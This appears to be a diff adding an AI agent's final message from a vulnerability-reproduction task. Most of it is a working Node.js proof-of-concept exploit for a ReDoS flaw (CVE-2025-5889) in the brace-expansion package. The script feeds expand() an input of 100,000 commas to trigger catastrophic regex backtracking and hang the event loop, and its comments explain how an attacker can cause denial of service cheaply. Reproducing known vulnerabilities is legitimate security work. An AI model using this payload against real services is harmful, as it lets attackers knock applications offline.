@@ -1,0 +1,22 @@
+Right — that needs to run from the module_14 directory where node_modules lives. Confirmed the vulnerability already in the earlier test with the absolute path. Here's the final exploit:
+
+```javascript
+// ReDoS (CVE-2025-5889) in brace-expansion <=1.1.11 (node_modules/brace-expansion@1.1.6)
+// The `isOptions` check in expand(): /^(.*,)+(.+)?$/.test(m.body)
+// exhibits quadratic/exponential backtracking on inputs with many commas,
+// letting an attacker hang the event loop with a short, cheap-looking input.
+
+const expand = require("brace-expansion");
+
+const n = 100000;
+const malicious = "{a}" + ",".repeat(n) + " "; // short to construct, expensive to parse
+
+console.log("Triggering brace-expansion ReDoS with input length:", malicious.length);
+
+const start = Date.now();
+expand(malicious);
+const elapsed = Date.now() - start;
+
+console.log("expand() took", elapsed, "ms for", n, "commas");
+console.log("Time grows quadratically with comma count -> Denial of Service");
+```
